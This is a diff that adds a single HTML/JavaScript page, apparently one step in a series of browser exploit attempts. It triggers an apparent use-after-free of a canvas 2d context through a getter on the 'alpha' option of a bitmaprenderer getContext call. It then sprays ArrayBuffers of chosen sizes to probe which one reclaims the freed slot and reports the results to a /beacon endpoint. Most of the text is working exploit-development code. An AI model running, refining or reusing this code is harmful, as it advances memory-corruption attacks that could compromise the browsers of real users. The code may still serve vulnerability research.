@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V687 size class oracle</title></head>
+<body><pre id="out">V687 — which ArrayBuffer size steals the freed context slot?</pre>
+<script>
+/* V687  ---  size-class oracle
+ *
+ * V686 failed twice, but that run could not tell us whether the failure was
+ *   (a) ArrayBuffer(768) never landing in the context's size class, or
+ *   (b) something else killing the call.
+ *
+ * V687 turns the problem into a measurement:
+ *
+ *   trigger -> [spray N ArrayBuffers of exactly SZ bytes]
+ *           -> OSPRAY beacon (sync)
+ *           -> create K fresh 2d contexts on other canvases (same-type reclaim)
+ *           -> read savedCtx.canvas / lineWidth  (same test as V684 whoami)
+ *
+ * Control SZ=0: the fresh contexts reclaim the slot, read succeeds, and we get
+ *               hit=<idx>, lw=<200+idx>  (expected: hit=4 with K=24).
+ * SZ == sizeof(CanvasRenderingContext2D) class:
+ *               our ArrayBuffer owns the slot, the fresh contexts cannot take
+ *               it, m_canvas is zeroed => crash, no OSTEP for that run.
+ *
+ * So the *only* SZ value that crashes is the object's real size class.
+ * Sweep 0 (control), 640, 704, 768, 832, 896, 1024.
+ *
+ * Modes: op=absize&sz=<bytes>&n=<ab count>&k=<ctx count> | op=reset
+ */
+'use strict';
+var PARAM = {};
+try {
+  var parts = location.search.replace(/^\?/, '').split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+
+var MODE = PARAM.op || 'absize';
+var SZ   = parseInt(PARAM.sz || '0', 10);
+var NAB  = parseInt(PARAM.n  || '16', 10);
+var KCTX = parseInt(PARAM.k  || '24', 10);
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function st() {
+  try { if (window.localStorage) return window.localStorage; } catch (e) {}
+  try { if (window.sessionStorage) return window.sessionStorage; } catch (e) {}
+  return null;
+}
+var ST = st();
+function stGet(k) { try { return ST ? ST.getItem(k) : null; } catch (e) { return null; } }
+function stSet(k, v) { try { if (ST) ST.setItem(k, v); } catch (e) {} }
+
+function bk(tag, body) {
+  try { new Image().src = '/beacon/V687-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now(); } catch (e) {}
+}
+function bks(tag, body) {
+  var u = '/beacon/V687-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+function clearOnce() {
+  var n = 0, pref = ['v683c_', 'v684c_', 'v685c_', 'v686c_', 'v687c_'];
+  try {
+    var keys = [];
+    for (var k = 0; k < ST.length; k++) keys.push(ST.key(k));
+    for (var j = 0; j < keys.length; j++) {
+      for (var p = 0; p < pref.length; p++) {
+        if (keys[j] && keys[j].indexOf(pref[p]) === 0) { ST.removeItem(keys[j]); n++; break; }
+      }
+    }
+  } catch (e) {}
+  return n;
+}
+
+function d2hex(v) {
+  var b = new ArrayBuffer(8), f = new Float64Array(b), u = new Uint32Array(b);
+  f[0] = v;
+  return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8);
+}
+
+if (MODE === 'reset' || PARAM.reset === '1') {
+  var cn = clearOnce();
+  bks('ORESET', 'cleared=1,once=' + cn);
+  say('all guards cleared. Reload the index.');
+}
+
+if (MODE !== 'reset') {
+  var onceKey = 'v687c_' + MODE + '_sz' + SZ;
+  var once = PARAM.once === '1';
+  var blocked = false;
+  if (once) {
+    if (stGet(onceKey) === '1') blocked = true;
+    else stSet(onceKey, '1');
+  }
+
+  if (blocked) {
+    bks('OBLOCK', 'sz=' + SZ);
+    say('BLOCKED by once=1 for sz=' + SZ + ' (tap RESET)');
+  } else {
+    setTimeout(function () { bk('OLATE', 'sz=' + SZ + ',alive=1'); }, 2500);
+
+    bks('OBOOT', 'op=' + MODE + ',sz=' + SZ + ',n=' + NAB + ',k=' + KCTX + ',once=' + (once ? 1 : 0));
+
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    document.body.appendChild(canvas);
+    window._v687canvas = canvas;
+
+    var savedCtx = null;
+    var dict = {};
+    Object.defineProperty(dict, 'alpha', {
+      get: function () {
+        var ctx = canvas.getContext('2d');
+        if (!ctx) return true;
+        savedCtx = ctx;
+        window._v687ctx = ctx;
+        try { ctx.lineWidth = 3.14159; } catch (eI) {}
+        return true;
+      }
+    });
+
+    var bmpCtx = null;
+    try { bmpCtx = canvas.getContext('bitmaprenderer', dict); } catch (eJ) {}
+
+    bks('OTRIG', 'sz=' + SZ + ',bmp=' + (bmpCtx ? 1 : 0) + ',inner=' + (savedCtx ? 1 : 0));
+
+    if (!savedCtx || !bmpCtx) {
+      bks('OFAIL', 'sz=' + SZ + ',trigger');
+      say('ABORT: trigger failed');
+    } else {
+      /* ---- optional: steal the slot with ArrayBuffers of size SZ ---- */
+      var abs = [];
+      if (SZ > 0) {
+        for (var i = 0; i < NAB; i++) {
+          var ab = new ArrayBuffer(SZ);
+          var u8 = new Uint8Array(ab);
+          u8[0] = 0x41;                      /* keep the buffer alive / touched */
+          abs.push(ab);
+        }
+        window._v687abs = abs;
+      }
+      bks('OSPRAY', 'sz=' + SZ + ',made=' + abs.length);
+
+      /* ---- same-type reclaim: takes the slot only if no AB did ---- */
+      var ckeep = new Array(KCTX), cmade = 0;
+      for (var c = 0; c < KCTX; c++) {
+        var cc = document.createElement('canvas');
+        cc.width = 1; cc.height = 1;
+        var cx = null;
+        try { cx = cc.getContext('2d'); } catch (eT) {}
+        if (cx) {
+          try { cx.lineWidth = 200 + cmade; } catch (eU) {}
+          ckeep[cmade] = cc;
+          cmade++;
+        }
+      }
+      window._v687keep = ckeep;
+
+      var hit = -1, lw = null, err = '';
+      try {
+        for (var k = 0; k < cmade; k++) {
+          if (savedCtx.canvas === ckeep[k]) { hit = k; break; }
+        }
+        if (hit >= 0) lw = savedCtx.lineWidth;
+        bks('OSTEP', 'op=absize,sz=' + SZ + ',made=' + cmade + ',hit=' + hit +
+            ',lw=' + (lw === null ? 'na' : d2hex(lw)));
+        say('sz=' + SZ + ' made=' + cmade + ' hit=' + hit + ' lw=' + (lw === null ? 'na' : d2hex(lw)));
+      } catch (eV) {
+        err = eV.name || 'err';
+        bks('OSTEP', 'op=absize,sz=' + SZ + ',E!' + err);
+        say('sz=' + SZ + ' THROW ' + err);
+      }
+    }
+  }
+}
+</script>
+</body></html>
